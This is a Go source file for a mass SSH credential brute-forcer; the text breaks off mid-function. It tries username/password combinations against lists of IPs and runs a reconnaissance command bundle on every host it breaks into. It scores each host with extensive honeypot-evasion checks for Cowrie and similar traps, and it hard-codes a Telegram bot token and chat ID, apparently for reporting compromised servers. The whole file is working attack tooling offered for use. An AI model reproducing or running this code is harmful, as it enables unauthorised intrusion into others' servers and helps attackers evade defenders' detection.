// Made By TreTrauNetwork 
// @thaituduc
package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"golang.org/x/crypto/ssh"
)

var startTime time.Time
var totalIPCount int
var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
var ipFile string
var timeout int
var maxConnections int

const VERSION = "3.0" // Enhanced honeypot detection 2026
var (
	successfulIPs       = make(map[string]struct{})
	mapMutex            sync.Mutex
	botToken            = "8734427220:AAHj-YrWp0Gy3AbfLfLepYml9LkVh89h4hY"
	chatIDs             = []int64{7520171626}
	concurrentPerWorker int
	successChan = make(chan Success, 200)
)

type IPInfo struct {
	IP      string `json:"ip"`
	City    string `json:"city"`
	Region  string `json:"region"`
	Country string `json:"country"`
	Org     string `json:"org"`
}

type Success struct {
	Info   *ServerInfo
	IPInfo IPInfo
}

type SSHTask struct {
	IP       string
	Port     string
	Username string
	Password string
}

type ServerInfo struct {
	IP              string
	Port            string
	Username        string
	Password        string
	IsHoneypot      bool
	HoneypotScore   int
	SSHVersion      string
	OSInfo          string
	Hostname        string
	ResponseTime    time.Duration
	Commands        map[string]string
	OpenPorts       []string
	CPUCores        int
	Architecture    string
	CPUModel        string
	MemoryKB        int
	DiskKB          int
	MaxDiskGB       int
	GPUInfo         string
	UserCount       int
	PackageCount    int
	IsContainer     bool
}


func main() {
	if len(os.Args) != 7 {
		log.Fatal("Usage: go run test.go <user.txt> <pass.txt> <ip.txt> <delay> <low_thread> <max_thread>")
	}

	usernameFile := os.Args[1]
	passwordFile := os.Args[2]
	ipFile = os.Args[3]
	timeoutStr := os.Args[4]
	lowThreadStr := os.Args[5]
	maxConnectionsStr := os.Args[6]

	timeout, _ = strconv.Atoi(timeoutStr)
	concurrentPerWorker, _ = strconv.Atoi(lowThreadStr)
	maxConnections, _ = strconv.Atoi(maxConnectionsStr)

	createComboFile(usernameFile, passwordFile)
	fmt.Printf("IP file: %s, Timeout: %ds, Low Thread: %d, Max Thread: %d\n", ipFile, timeout, concurrentPerWorker, maxConnections)

	startTime = time.Now()

	combos := getItems("combo.txt")
	ips := getItems(ipFile)
	totalIPCount = len(ips) * len(combos)

	setupEnhancedWorkerPool(combos, ips)
	banner()
	fmt.Println("Operation completed successfully!")
}

func getItems(path string) [][]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatalf("Failed to open file: %s", err)
	}
	defer file.Close()

	var items [][]string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if line != "" {
			items = append(items, strings.Split(line, ":"))
		}
	}
	return items
}

func clear() {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func createComboFile(usernameFile, passwordFile string) {
	usernames := getItems(usernameFile)
	passwords := getItems(passwordFile)

	file, err := os.Create("combo.txt")
	if err != nil {
		log.Fatalf("Failed to create combo file: %s", err)
	}
	defer file.Close()

	for _, username := range usernames {
		for _, password := range passwords {
			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
		}
	}
}

func gatherSystemInfo(client *ssh.Client, serverInfo *ServerInfo) {
	// Gộp TẤT CẢ commands thành 1 mega-command duy nhất — 1 SSH session cho mọi thứ
	megaCmd := `echo "===HOSTNAME==="; hostname 2>/dev/null || echo EMPTY;
echo "===UNAME==="; uname -a 2>/dev/null || echo EMPTY;
echo "===WHOAMI==="; whoami 2>/dev/null || echo EMPTY;
echo "===PWD==="; pwd 2>/dev/null || echo EMPTY;
echo "===LS_ROOT==="; ls -la / 2>/dev/null | head -10 || echo EMPTY;
echo "===PS==="; ps aux 2>/dev/null | head -15 || echo EMPTY;
echo "===NETSTAT==="; netstat -tulpn 2>/dev/null | head -10 || echo EMPTY;
echo "===HISTORY==="; history 2>/dev/null | tail -5 || echo EMPTY;
echo "===SSH_VERSION==="; ssh -V 2>&1 || echo EMPTY;
echo "===UPTIME==="; uptime 2>/dev/null || echo EMPTY;
echo "===MOUNT==="; mount 2>/dev/null | head -5 || echo EMPTY;
echo "===ENV==="; env 2>/dev/null | head -10 || echo EMPTY;
echo "===CPU_CORES==="; nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 0;
echo "===ARCH==="; uname -m 2>/dev/null || echo unknown;
echo "===CPU_MODEL==="; grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | cut -d ':' -f2- | sed 's/^ *//' || echo unknown;
echo "===RESOURCES==="; echo MEMKB=$(awk '/MemTotal/{print $2}' /proc/meminfo 2>/dev/null) DISKKB=$(df / 2>/dev/null | awk 'NR==2{print $2}') USERCNT=$(wc -l < /etc/passwd 2>/dev/null) PKGCNT=$(dpkg -l 2>/dev/null | grep -c '^ii' || rpm -qa 2>/dev/null | wc -l || echo 0);
echo "===CONTAINER==="; cat /proc/1/cgroup 2>/dev/null | head -3; test -f /.dockerenv && echo DOCKERENV; test -f /run/.containerenv && echo CONTAINERENV; echo;
echo "===COWRIE==="; ls /opt/cowrie /home/richard /etc/cowrie 2>&1;
echo "===DMESG==="; dmesg 2>/dev/null | head -5 || echo EMPTY;
echo "===PORTS==="; ss -tulpn 2>/dev/null | grep LISTEN | head -20 || netstat -tulpn 2>/dev/null | grep LISTEN | head -20 || echo EMPTY;
echo "===NETCFG==="; ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -3 || echo EMPTY;
echo "===IPADDR==="; ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5 || echo EMPTY;
echo "===IPROUTE==="; ip route show 2>/dev/null | head -3 || echo EMPTY;
echo "===WRITE==="; TF=/tmp/t_$$; echo test > $TF 2>&1 && echo WRITEOK && rm -f $TF || echo WRITEFAIL;
echo "===IDCHECK==="; id 2>/dev/null && echo IDOK || echo IDFAIL; whoami 2>/dev/null && echo WHOAMIOK || echo WHOAMIFAIL;
echo "===PKGMGR==="; which apt 2>/dev/null || which yum 2>/dev/null || which pacman 2>/dev/null || which zypper 2>/dev/null || echo NOPKG;
echo "===SERVICES==="; systemctl list-units --type=service --state=running 2>/dev/null | head -10 || echo NOSVC;
echo "===SOCKETS==="; ss -tuln 2>/dev/null | wc -l || echo 0;
echo "===GPU==="; nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null || echo NOGPU;
echo "===MAXDISK==="; df -BG 2>/dev/null | awk 'NR>1{gsub("G","",$2); if($2+0>max) max=$2+0} END{print max+0}' || echo 0;
echo "===END==="`

	output := executeCommand(client, megaCmd)

	// Parse mega output thành từng section
	sections := parseMegaOutput(output)

	serverInfo.Commands["hostname"] = sections["HOSTNAME"]
	serverInfo.Commands["uname"] = sections["UNAME"]
	serverInfo.Commands["whoami"] = sections["WHOAMI"]
	serverInfo.Commands["pwd"] = sections["PWD"]
	serverInfo.Commands["ls_root"] = sections["LS_ROOT"]
	serverInfo.Commands["ps"] = sections["PS"]
	serverInfo.Commands["netstat"] = sections["NETSTAT"]
	serverInfo.Commands["history"] = sections["HISTORY"]
	serverInfo.Commands["ssh_version"] = sections["SSH_VERSION"]
	serverInfo.Commands["uptime"] = sections["UPTIME"]
	serverInfo.Commands["mount"] = sections["MOUNT"]
	serverInfo.Commands["env"] = sections["ENV"]
	serverInfo.Commands["cpu_cores"] = sections["CPU_CORES"]
	serverInfo.Commands["arch"] = sections["ARCH"]
	serverInfo.Commands["cpu_model"] = sections["CPU_MODEL"]
	serverInfo.Commands["resources"] = sections["RESOURCES"]
	serverInfo.Commands["container_check"] = sections["CONTAINER"]
	serverInfo.Commands["cowrie_check"] = sections["COWRIE"]
	serverInfo.Commands["dmesg_check"] = sections["DMESG"]
	serverInfo.Commands["netcfg"] = sections["NETCFG"]
	serverInfo.Commands["ipaddr"] = sections["IPADDR"]
	serverInfo.Commands["iproute"] = sections["IPROUTE"]
	serverInfo.Commands["write_test"] = sections["WRITE"]
	serverInfo.Commands["id_check"] = sections["IDCHECK"]
	serverInfo.Commands["pkgmgr"] = sections["PKGMGR"]
	serverInfo.Commands["services"] = sections["SERVICES"]
	serverInfo.Commands["sockets"] = sections["SOCKETS"]
	serverInfo.Commands["gpu"] = sections["GPU"]
	serverInfo.Commands["maxdisk"] = sections["MAXDISK"]

	serverInfo.Hostname = strings.TrimSpace(sections["HOSTNAME"])
	serverInfo.OSInfo = strings.TrimSpace(sections["UNAME"])
	serverInfo.SSHVersion = strings.TrimSpace(sections["SSH_VERSION"])

	if coresStr := strings.TrimSpace(sections["CPU_CORES"]); coresStr != "" && coresStr != "EMPTY" {
		if n, err := strconv.Atoi(coresStr); err == nil {
			serverInfo.CPUCores = n
		}
	}
	serverInfo.Architecture = strings.TrimSpace(sections["ARCH"])
	serverInfo.CPUModel = strings.TrimSpace(sections["CPU_MODEL"])

	if resOut := sections["RESOURCES"]; resOut != "" {
		resMem := regexp.MustCompile(`MEMKB=(\d+)`)
		resDisk := regexp.MustCompile(`DISKKB=(\d+)`)
		resUser := regexp.MustCompile(`USERCNT=(\d+)`)
		resPkg := regexp.MustCompile(`PKGCNT=(\d+)`)
		if m := resMem.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.MemoryKB, _ = strconv.Atoi(m[1])
		}
		if m := resDisk.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.DiskKB, _ = strconv.Atoi(m[1])
		}
		if m := resUser.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.UserCount, _ = strconv.Atoi(m[1])
		}
		if m := resPkg.FindStringSubmatch(resOut); len(m) > 1 {
			serverInfo.PackageCount, _ = strconv.Atoi(m[1])
		}
	}
	// Parse GPU info
	if gpuOut := strings.TrimSpace(sections["GPU"]); gpuOut != "" && gpuOut != "NOGPU" {
		serverInfo.GPUInfo = gpuOut
	}

	// Parse max disk (lấy partition lớn nhất, đơn vị GB)
	if maxDiskStr := strings.TrimSpace(sections["MAXDISK"]); maxDiskStr != "" && maxDiskStr != "0" {
		if n, err := strconv.Atoi(maxDiskStr); err == nil && n > 0 {
			serverInfo.MaxDiskGB = n
		}
	}

	if dockerOut := sections["CONTAINER"]; dockerOut != "" {
		lower := strings.ToLower(dockerOut)
		serverInfo.IsContainer = strings.Contains(lower, "docker") || strings.Contains(lower, "lxc") ||
			strings.Contains(lower, "containerenv") || strings.Contains(lower, "dockerenv") ||
			strings.Contains(lower, "kubepods")
	}

	// Parse ports từ ss/netstat output (đã gộp trong mega command)
	portsOut := sections["PORTS"]
	if portsOut != "" && portsOut != "EMPTY" {
		portRegex := regexp.MustCompile(`:(\d+)\s`)
		for _, line := range strings.Split(portsOut, "\n") {
			matches := portRegex.FindAllStringSubmatch(line, -1)
			for _, match := range matches {
				if len(match) > 1 && !contains(serverInfo.OpenPorts, match[1]) {
					serverInfo.OpenPorts = append(serverInfo.OpenPorts, match[1])
				}
			}
		}
	}
}

func parseMegaOutput(output string) map[string]string {
	sections := make(map[string]string)
	markers := []string{"HOSTNAME", "UNAME", "WHOAMI", "PWD", "LS_ROOT", "PS", "NETSTAT",
		"HISTORY", "SSH_VERSION", "UPTIME", "MOUNT", "ENV", "CPU_CORES", "ARCH",
		"CPU_MODEL", "RESOURCES", "CONTAINER", "COWRIE", "DMESG", "PORTS",
		"NETCFG", "IPADDR", "IPROUTE", "WRITE", "IDCHECK", "PKGMGR", "SERVICES", "SOCKETS",
		"GPU", "MAXDISK", "END"}

	for i := 0; i < len(markers)-1; i++ {
		startTag := "===" + markers[i] + "==="
		endTag := "===" + markers[i+1] + "==="
		startIdx := strings.Index(output, startTag)
		endIdx := strings.Index(output, endTag)
		if startIdx >= 0 && endIdx > startIdx {
			content := output[startIdx+len(startTag) : endIdx]
			sections[markers[i]] = strings.TrimSpace(content)
		}
	}
	return sections
}

func executeCommand(client *ssh.Client, command string) string {
	// Thử không PTY trước (12s timeout — đủ cho mega-command trên server chậm)
	out := execWithTimeout(client, command, false, 12*time.Second)
	// Nếu fail/rỗng → thử PTY (timeout dài hơn cho server chậm cần pseudo terminal)
	if out == "" || strings.HasPrefix(out, "ERROR:") {
		retryOut := execWithTimeout(client, command, true, 25*time.Second)
		if retryOut != "" && !strings.HasPrefix(retryOut, "ERROR:") {
			return retryOut
		}
		if out == "" {
			return retryOut
		}
	}
	return out
}

func execWithTimeout(client *ssh.Client, command string, usePTY bool, timeout time.Duration) string {
	session, err := client.NewSession()
	if err != nil {
		return fmt.Sprintf("ERROR: %v", err)
	}
	defer session.Close()

	if usePTY {
		modes := ssh.TerminalModes{
			ssh.ECHO:          0,
			ssh.TTY_OP_ISPEED: 14400,
			ssh.TTY_OP_OSPEED: 14400,
		}
		session.RequestPty("xterm", 200, 200, modes)
	}

	type result struct {
		out []byte
		err error
	}
	ch := make(chan result, 1)
	go func() {
		out, err := session.CombinedOutput(command)
		ch <- result{out, err}
	}()

	select {
	case r := <-ch:
		if r.err != nil && len(r.out) == 0 {
			return fmt.Sprintf("ERROR: %v", r.err)
		}
		cleaned := string(r.out)
		if usePTY {
			ansiRe := regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]|\r`)
			cleaned = ansiRe.ReplaceAllString(cleaned, "")
		}
		return cleaned
	case <-time.After(timeout):
		session.Close()
		return "ERROR: timeout"
	}
}

func formatDiskSize(gb int) string {
	if gb <= 0 {
		return "N/A"
	}
	if gb >= 1000 {
		return fmt.Sprintf("%.1f TB", float64(gb)/1000.0)
	}
	return fmt.Sprintf("%d GB", gb)
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func detectHoneypot(serverInfo *ServerInfo) bool {
	score := 0
	score += analyzeCommandOutput(serverInfo)
	score += analyzeResponseTime(serverInfo)
	score += analyzeFileSystem(serverInfo)
	score += analyzeProcesses(serverInfo)
	score += analyzeNetwork(serverInfo)
	score += behavioralTests(serverInfo)
	score += detectAnomalies(serverInfo)
	score += advancedHoneypotTests(serverInfo)
	score += detectArchMismatch(serverInfo)
	score += detectHostnameAnomalies(serverInfo)
	score += detectSSHAnomalies(serverInfo)
	score += detectSuspiciousPorts(serverInfo)
	score += detectKernelAnomalies(serverInfo)
	score += detectCowrie2026(serverInfo)
	score += detectContainerHoneypot(serverInfo)
	score += detectResourceAnomalies(serverInfo)
	score += detectOutputAnomalies(serverInfo)
	// Legitimacy bonus: real servers get score reduced
	score -= legitimacyBonus(serverInfo)
	if score < 0 {
		score = 0
	}
	serverInfo.HoneypotScore = score
	return score >= 6
}

// Phát hiện output bất thường: too many connections, all ERROR, connection closed, SSH banner lạ
func detectOutputAnomalies(serverInfo *ServerInfo) int {
	score := 0

	// Đếm bao nhiêu commands trả về ERROR
	errorCount := 0
	totalCount := 0
	for _, output := range serverInfo.Commands {
		if output == "" {
			continue
		}
		totalCount++
		lower := strings.ToLower(output)
		if strings.HasPrefix(lower, "error") || lower == "empty" {
			errorCount++
		}
	}
	// Hầu hết commands đều ERROR = honeypot hoặc restricted shell
	if totalCount > 5 && errorCount > totalCount/2 {
		score += 3
	}

	// "Too many connection attempts" = honeypot giả mạo
	hostLower := strings.ToLower(serverInfo.Hostname)
	if strings.Contains(hostLower, "too many") || strings.Contains(hostLower, "connection attempt") {
		score += 6
	}

	// SSH banner lạ (không phải OpenSSH/Dropbear format)
	sshVer := strings.ToLower(serverInfo.SSHVersion)
	if sshVer != "" && sshVer != "empty" && !strings.Contains(sshVer, "error") {
		if !strings.Contains(sshVer, "openssh") && !strings.Contains(sshVer, "dropbear") &&
			!strings.Contains(sshVer, "ssh-") && !strings.Contains(sshVer, "usage:") {
			// SSH banner chứa text quảng cáo, recruitment, etc
			if strings.Contains(sshVer, "join") || strings.Contains(sshVer, "email") ||
				strings.Contains(sshVer, "agency") || strings.Contains(sshVer, "send") ||
				strings.Contains(sshVer, "http") || strings.Contains(sshVer, "welcome") {
				score += 4
			}
		}
	}

	return score
}

func analyzeCommandOutput(serverInfo *ServerInfo) int {
	score := 0
	for _, output := range serverInfo.Commands {
		lower := strings.ToLower(output)
		for _, term := range []string{"fake", "simulation", "honeypot", "trap", "monitor", "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap"} {
			if strings.Contains(lower, term) {
				score += 3
			}
		}
	}
	return score
}

func analyzeResponseTime(serverInfo *ServerInfo) int {
	if serverInfo.ResponseTime.Milliseconds() < 10 {
		return 2
	}
	return 0
}

func analyzeFileSystem(serverInfo *ServerInfo) int {
	score := 0
	if output, ok := serverInfo.Commands["ls_root"]; ok {
		lower := strings.ToLower(output)
		for _, p := range []string{"total 0", "total 4", "honeypot", "fake", "simulation"} {
			if strings.Contains(lower, p) {
				score++
			}
		}
		if len(strings.Split(strings.TrimSpace(output), "\n")) < 5 {
			score++
		}
	}
	return score
}

func analyzeProcesses(serverInfo *ServerInfo) int {
	score := 0
	if output, ok := serverInfo.Commands["ps"]; ok {
		lower := strings.ToLower(output)
		for _, p := range []string{"cowrie", "kippo", "honeypot", "honeyd", "artillery", "honeytrap", "glastopf"} {
			if strings.Contains(lower, p) {
				score += 2
			}
		}
		if len(strings.Split(strings.TrimSpace(output), "\n")) < 5 {
			score++
		}
	}
	return score
}

func analyzeNetwork(serverInfo *ServerInfo) int {
	score := 0
	if cfg, ok := serverInfo.Commands["netcfg"]; ok {
		lower := strings.ToLower(cfg)
		if len(strings.TrimSpace(cfg)) < 10 || strings.Contains(lower, "total 0") || lower == "empty" {
			score++
		}
	}
	if addr, ok := serverInfo.Commands["ipaddr"]; ok {
		lower := strings.ToLower(addr)
		if len(strings.TrimSpace(addr)) < 10 || strings.Contains(lower, "fake") || lower == "empty" {
			score++
		}
	}
	if route, ok := serverInfo.Commands["iproute"]; ok {
		lower := strings.ToLower(route)
		if len(strings.TrimSpace(route)) < 20 || lower == "empty" {
			score++
		}
	}
	return score
}

func behavioralTests(serverInfo *ServerInfo) int {
	score := 0
	// Write test
	if wt, ok := serverInfo.Commands["write_test"]; ok {
		lower := strings.ToLower(wt)
		if strings.Contains(lower, "writefail") || strings.Contains(lower, "permission") {
			score++
		}
	}
	// ID/whoami check
	if idc, ok := serverInfo.Commands["id_check"]; ok {
		lower := strings.ToLower(idc)
		if strings.Contains(lower, "idfail") && strings.Contains(lower, "whoamifail") {
			score += 2
		}
	}
	return score
}

func advancedHoneypotTests(serverInfo *ServerInfo) int {
	score := 0
	// QEMU/Virtual CPU
	if chip := strings.ToLower(serverInfo.CPUModel); strings.Contains(chip, "qemu") {
		score++
	}
	// No package manager
	if pkg, ok := serverInfo.Commands["pkgmgr"]; ok {
		if strings.Contains(strings.ToLower(pkg), "nopkg") {
			score++
		}
	}
	// No/few services
	if svc, ok := serverInfo.Commands["services"]; ok {
		lower := strings.ToLower(svc)
		if strings.Contains(lower, "nosvc") || strings.Contains(lower, "0 loaded") {
			score++
		}
	}
	// Few sockets
	if sock, ok := serverInfo.Commands["sockets"]; ok {
		sockStr := strings.TrimSpace(sock)
		if n, err := strconv.Atoi(sockStr); err == nil && n < 3 {
			score++
		}
	}
	return score
}

func detectArchMismatch(serverInfo *ServerInfo) int {
	score := 0
	arch := strings.ToLower(serverInfo.Architecture)
	chip := strings.ToLower(serverInfo.CPUModel)

	// ARM/MIPS architecture but reporting Intel/AMD chip = emulated/honeypot
	if arch == "armv7l" || arch == "aarch64" || strings.HasPrefix(arch, "mips") {
		if strings.Contains(chip, "intel") || strings.Contains(chip, "amd") || strings.Contains(chip, "xeon") ||
			strings.Contains(chip, "broadwell") || strings.Contains(chip, "skylake") || strings.Contains(chip, "haswell") {
			score += 3
		}
	}

	// i686 with server-grade chip (real servers would report x86_64) = IMPOSSIBLE
	if arch == "i686" {
		if strings.Contains(chip, "xeon") || strings.Contains(chip, "epyc") ||
			strings.Contains(chip, "platinum") || strings.Contains(chip, "gold") ||
			strings.Contains(chip, "broadwell") || strings.Contains(chip, "skylake") {
			score += 5
		}
	}

	// i686 on modern Ubuntu (22.04+) = impossible (Ubuntu dropped 32-bit)
	if arch == "i686" {
		osLower := strings.ToLower(serverInfo.OSInfo)
		for _, rel := range []string{"jammy", "noble", "mantic", "lunar", "kinetic"} {
			if strings.Contains(osLower, rel) || strings.Contains(strings.ToLower(serverInfo.Hostname), rel) {
				score += 3
				break
			}
		}
	}

	// MIPS/mipsel with high core count = impossible (real MIPS = 1-2 cores max)
	if strings.HasPrefix(arch, "mips") && serverInfo.CPUCores > 4 {
		score += 4
	}

	// CPU model rỗng trên multi-core system = honeypot giả cores
	if (chip == "" || chip == "unknown" || chip == "empty") && serverInfo.CPUCores > 2 {
		score += 2
	}

	// Kernel build #0 = bất thường (real kernels start at #1)
	if strings.Contains(serverInfo.OSInfo, " #0 ") {
		score += 2
	}

	return score
}

func detectHostnameAnomalies(serverInfo *ServerInfo) int {
	score := 0
	hostname := strings.TrimSpace(serverInfo.Hostname)
	hostLower := strings.ToLower(hostname)
	osInfo := serverInfo.OSInfo

	// hostname command returned ERROR (command not found / failed)
	if strings.Contains(hostLower, "error") {
		score += 2
	}

	// Container-like hostname prefixes
	for _, prefix := range []string{"container-", "docker-", "lxc-", "pod-", "instance-", "vm-"} {
		if strings.HasPrefix(hostLower, prefix) {
			score += 2
			break
		}
	}

	// Known honeypot / IoT / fake hostname patterns (2026)
	honeypotHostRe := regexp.MustCompile(`(?i)^(USR-G\d+|wrt-[a-f0-9]+|db-[a-f0-9]+|gw-[a-f0-9]+|srv-[a-f0-9]+|router-[a-f0-9]+|node-[a-f0-9]+|host-[a-f0-9]+|CCR\d+-[a-f0-9]+|ubuntu-\w+-\d+|container-[a-f0-9]+|compute-node[\-\d]*|gpu-node-\d+|prod-api-\d+|worker-\d+|build-\d+|staging-\d+|k8s-node-\d+|web-\d+|app-\d+|[a-z]{2,3}-\d{2,4})$`)
	if honeypotHostRe.MatchString(hostname) {
		score += 3
	}

	// Hostname vs uname hostname mismatch
	// uname -a: "Linux <uname_host> <kernel> ..."
	if osInfo != "" && !strings.Contains(hostLower, "error") && hostname != "" {
		fields := strings.Fields(osInfo)
		if len(fields) >= 2 {
			unameHost := strings.ToLower(fields[1])
			if unameHost != hostLower && unameHost != "" {
				score += 2
			}
		}
	}

	// Hostname claims Ubuntu but kernel is RHEL/CentOS
	if strings.Contains(hostLower, "ubuntu") {
		osLower := strings.ToLower(osInfo)
		if strings.Contains(osLower, ".el7") || strings.Contains(osLower, ".el8") || strings.Contains(osLower, ".el9") {
			score += 2
		}
	}

	return score
}

func detectSSHAnomalies(serverInfo *ServerInfo) int {
	score := 0
	sshVer := serverInfo.SSHVersion
	sshLower := strings.ToLower(sshVer)

	// SSH -V returns usage output instead of version string (chỉ +1, phổ biến trên server real)
	if strings.Contains(sshLower, "usage: ssh") || strings.Contains(sshVer, "[-46AaCfGg") {
		score += 1
	}

	// SSH version returned error
	if strings.Contains(sshLower, "error") {
		score += 1
	}

	// SSH Version hoàn toàn rỗng = rất khả nghi (real server luôn có ssh version)
	if strings.TrimSpace(sshVer) == "" || strings.TrimSpace(sshVer) == "EMPTY" {
		score += 3
		// Server mạnh (multi-core) mà không có SSH version = CỰC kỳ khả nghi
		if serverInfo.CPUCores >= 4 {
			score += 2
		}
	}

	return score
}

func detectSuspiciousPorts(serverInfo *ServerInfo) int {
	score := 0

	// Port 2222 is the default Cowrie honeypot port
	for _, p := range serverInfo.OpenPorts {
		if p == "2222" {
			score += 2
			break
		}
	}

	// No open ports = suspicious chỉ khi thực sự có output PORTS (không phải parse fail)
	if len(serverInfo.OpenPorts) == 0 {
		if portsOut, ok := serverInfo.Commands["netstat"]; ok && len(strings.TrimSpace(portsOut)) > 5 {
			score += 2
		}
	}

	return score
}

func detectKernelAnomalies(serverInfo *ServerInfo) int {
	score := 0
	osLower := strings.ToLower(serverInfo.OSInfo)

	// PREEMPT_DYNAMIC bất thường trên server thật, phổ biến ở container/honeypot
	if strings.Contains(osLower, "preempt_dynamic") {
		score += 2
	}

	// Fingerprint kernel honeypot 2026: tất cả dùng chung build date
	if strings.Contains(osLower, "feb 10 14:32:00 utc 2026") {
		score += 3
	}

	// Known router/IoT kernel + device pattern
	if strings.Contains(osLower, "usr-g") {
		score += 1
	}

	return score
}

func detectCowrie2026(serverInfo *ServerInfo) int {
	score := 0

	// Check for Cowrie/honeypot filesystem artifacts
	if cowrieOut, ok := serverInfo.Commands["cowrie_check"]; ok {
		lower := strings.ToLower(cowrieOut)
		if strings.Contains(lower, "/opt/cowrie") && !strings.Contains(lower, "no such file") && !strings.Contains(lower, "cannot access") {
			score += 4
		}
		if strings.Contains(lower, "/home/richard") && !strings.Contains(lower, "no such file") && !strings.Contains(lower, "cannot access") {
			score += 3
		}
		if strings.Contains(lower, "/etc/cowrie") && !strings.Contains(lower, "no such file") && !strings.Contains(lower, "cannot access") {
			score += 4
		}
	}

	// Check environment variables for honeypot indicators
	if envOut, ok := serverInfo.Commands["env"]; ok {
		envLower := strings.ToLower(envOut)
		for _, indicator := range []string{"cowrie", "honeypot", "kippo", "hfish", "opencanary", "tpot", "honeytrap", "artillery"} {
			if strings.Contains(envLower, indicator) {
				score += 3
				break
			}
		}
	}

	// Check SSH banner for known honeypot emulation libraries
	if sshBanner := serverInfo.Commands["ssh_version"]; sshBanner != "" {
		lower := strings.ToLower(sshBanner)
		for _, sig := range []string{"paramiko", "twisted", "libssh-0.6"} {
			if strings.Contains(lower, sig) {
				score += 2
				break
			}
		}
	}

	// Check process list for honeypot daemons (modern 2026)
	if psOut, ok := serverInfo.Commands["ps"]; ok {
		psLower := strings.ToLower(psOut)
		for _, proc := range []string{"twistd", "cowrie", "kippo", "opencanary", "hfish", "dionaea", "conpot", "elastichoney", "mailoney", "medpot", "tanner"} {
			if strings.Contains(psLower, proc) {
				score += 3
				break
			}
		}
	}

	return score
}

func detectContainerHoneypot(serverInfo *ServerInfo) int {
	score := 0

	if !serverInfo.IsContainer {
		return 0
	}

	// Container with very low memory (< 256MB) = likely honeypot container
	if serverInfo.MemoryKB > 0 && serverInfo.MemoryKB < 262144 {
		score += 2
	}

	// Container with very few users (< 5)
	if serverInfo.UserCount > 0 && serverInfo.UserCount < 5 {
		score += 1
	}

	// Container with almost no packages installed
	if serverInfo.PackageCount >= 0 && serverInfo.PackageCount < 20 {
		score += 1
	}

	// Container with single CPU + emulated architecture
	arch := strings.ToLower(serverInfo.Architecture)
	if serverInfo.CPUCores <= 1 && (strings.HasPrefix(arch, "mips") || arch == "armv7l") {
		score += 1
	}

	return score
}

func detectResourceAnomalies(serverInfo *ServerInfo) int {
	score := 0

	// Very low memory (< 128MB) = suspicious
	if serverInfo.MemoryKB > 0 && serverInfo.MemoryKB < 131072 {
		score += 2
	}

	// Very low disk (< 1GB) = suspicious
	if serverInfo.DiskKB > 0 && serverInfo.DiskKB < 1048576 {
		score += 1
	}

	// Almost no users (< 3) = suspicious for a real system
	if serverInfo.UserCount > 0 && serverInfo.UserCount < 3 {
		score += 1
	}

	// No dmesg access on a non-container system = suspicious
	if dmesgOut, ok := serverInfo.Commands["dmesg_check"]; ok {
		lower := strings.ToLower(dmesgOut)
		if (strings.Contains(lower, "noaccess") || strings.Contains(lower, "error") || strings.Contains(lower, "operation not permitted")) && !serverInfo.IsContainer {
			score += 1
		}
	}

	return score
}

func legitimacyBonus(serverInfo *ServerInfo) int {
	bonus := 0

	// Real memory > 1GB
	if serverInfo.MemoryKB > 1048576 {
		bonus++
	}

	// Real disk > 10GB
	if serverInfo.DiskKB > 10485760 {
		bonus++
	}

	// Many users > 15 (real system with services)
	if serverInfo.UserCount > 15 {
		bonus++
	}

	// Multiple CPU cores
	if serverInfo.CPUCores > 1 {
		bonus++
	}

	// Many packages installed > 200 (real managed system)
	if serverInfo.PackageCount > 200 {
		bonus++
	}

	// Real dmesg output (hardware boot messages)
	if dmesgOut, ok := serverInfo.Commands["dmesg_check"]; ok {
		lower := strings.ToLower(dmesgOut)
		if !strings.Contains(lower, "noaccess") && !strings.Contains(lower, "error") && !strings.Contains(lower, "empty") && len(strings.TrimSpace(dmesgOut)) > 50 {
			bonus++
		}
	}

	// Real mount points (>= 4 mounts = real system)
	if mountOut, ok := serverInfo.Commands["mount"]; ok {
		lines := strings.Split(strings.TrimSpace(mountOut), "\n")
		if len(lines) >= 4 && !strings.Contains(strings.ToLower(mountOut), "error") {
			bonus++
		}
	}

	// Real uptime (server has been running)
	if upOut, ok := serverInfo.Commands["uptime"]; ok {
		upLower := strings.ToLower(upOut)
		if strings.Contains(upLower, "day") || strings.Contains(upLower, "min") {
			bonus++
		}
	}

	// Real ps output (many processes = real system)
	if psOut, ok := serverInfo.Commands["ps"]; ok {
		lines := strings.Split(strings.TrimSpace(psOut), "\n")
		if len(lines) >= 8 {
			bonus++
		}
	}

	// CAP: honeypot tinh vi giả mạo tất cả system info → bonus không được quá cao
	if bonus > 5 {
		bonus = 5
	}

	return bonus
}

func detectAnomalies(serverInfo *ServerInfo) int {
	score := 0
	if h := serverInfo.Hostname; h != "" {
		lower := strings.ToLower(h)
		for _, s := range []string{"honeypot", "fake", "trap", "monitor", "sandbox", "test", "simulation"} {
			if strings.Contains(lower, s) {
				score++
			}
		}
	}
	if out, ok := serverInfo.Commands["uptime"]; ok && (strings.Contains(out, "0:") || strings.Contains(out, "min")) {
		score++
	}
	if out, ok := serverInfo.Commands["history"]; ok && len(strings.Split(strings.TrimSpace(out), "\n")) < 3 {
		score++
	}
	return score
}

func getIPInfo(ip string) IPInfo {
	var info IPInfo
